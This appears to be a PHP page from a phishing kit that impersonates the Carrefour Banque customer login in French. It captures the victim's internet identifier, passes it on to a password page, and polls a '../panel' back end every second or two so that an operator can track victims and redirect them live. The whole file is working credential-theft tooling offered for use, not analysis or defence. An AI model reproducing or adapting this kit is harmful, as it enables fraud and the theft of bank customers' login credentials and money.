<?php 
session_start();
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Connexion à l’Espace Client</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="inc/jihanaid.css">
<link rel="stylesheet" href="inc/login.css">
</head>
<body style="background:#ddd;">
<div class="container bg-white" style="width:1170px;">
<div class="row colsholder d-block-on-below-700" >


<div class="col leftcol">
    <!-- start leftcol -->
<div class="backbtn">
<img src="inc/backbtn.png">
</div>

<div class="logo text-center">
    <img src="inc/logo.png">
</div>


<div class="form">
    <!-- form start -->
<div class="form-title">
    <h2 style="font-family:bold; color:#2d2d2d;">Accès à mon Espace Client</h2>
</div>

<?php
if(isset($_GET['e'])){ 
    echo '
<div class="form-col danger">
    Les informations saisies ne correspondent pas à l\'identifiant <em>'.@$_SESSION['user'].'</em>.
    Veuillez vérifier ces informations ou changer d\'identifiant.  [6051]
</div>';

}
?>

<div class="form-col">
    <label>Votre Identifiant Internet </label>
    <input type="text" class="textinput" id="u" maxlength="11" value="<?php echo @$_SESSION['v_log']; ?>">
    <a href="javascript:void(0)">Identifiant oublié ?</a>
</div>

<div class="form-col">
<label>
<input type="checkbox" style="width:27px; height:27px;">
Mémoriser mon identifiant </label>
</div>

<div class="form-col">
    <p style="color:red; font-size:1em; display:none;" id="u11">L'identifiant doit comporter 11 caractères.</p>
    <p style="color:red; font-size:1em; display:none;" id="u-required">Le champ Identifiant Internet est obligatoire.</p>
</div>

<div class="form-col">
<span>Pour cela nous déposons <a href="#">un cookie</a> dans votre navigateur qui nous permet de vous reconnaitre automatiquement lors de vos prochaines connexions.</span>         
</div>


<div class="form-col">
    <button class="sbmt" onclick="sendUser()">Valider</button>
</div>

<!-- end form -->

</div>

<!-- end leftcol -->
</div>



<div class="col rightcol">
<!-- start right col text boxes -->

<div class="textboxes" style="width:100%;">

<div class="box">
    <h3><img src="inc/info.png"> Mon espace client</h3>
    <p>
    <ul>
<li>Consultation de solde, dernières opérations et relevés mensuels</li>
<li>Demande de virement Crédit PASS</li>
<li>Consultation de vos compte épargnes et de vos intérêts</li>
<li>Demande de versements et plan de versement</li>
</ul>
<a href="#"><i class="fa-solid fa-angle-right"></i> Je découvre le Guide Espace Client Carrefour Banque</a>
   

    </p>
</div>

<div class="box">
<div class="row">

<div class="col">
<h3><img src="inc/lock.png"> Espace Client</h3>
<a href="#"><i class="fa-solid fa-angle-right"></i> Connectez-vous en toute sécurité</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Suivre ma demande</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Virement crédit PASS</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Appli mobile</a>
</div>

<div class="col">
<h3><img src="inc/info.png"> Infos légales</h3>
<a href="#"><i class="fa-solid fa-angle-right"></i> Cookies / Infos légales</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Paramétrage des cookies</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Conditions générales de vente</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Contact</a>
<a href="#"><i class="fa-solid fa-angle-right"></i> Accessibilité</a>
</div>

</div>
</div>



</div>

<!-- end right col text boxes -->
</div>






</div>
</div>
<script src="inc/cdns/jq.js"></script>
<script>

$("#u").keypress((e)=>{
    if(e.key=="Enter"){
        sendUser();
    }
});


function sendUser(){
    $("#u").removeClass("error");
    $("#u11").hide();
    $("#u-required").hide();


// var script = $("#u").val();
// let letterCount = 0;
// let numberCount = 0;

// for (let i = 0; i < script.length; i++) {
//   if (!isNaN(script[i])) {
//     numberCount++;
//   } else if (script[i].match(/[a-zA-Z]/i)) {
//     letterCount++;
//   }
// }



    if($("#u").val().length<11){
        $("#u11").show();
        $("#u").addClass("error");
    }else{

        window.location="pass.php?id="+$("#u").val();

    }

}




setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
 
</script>



</body>
</html>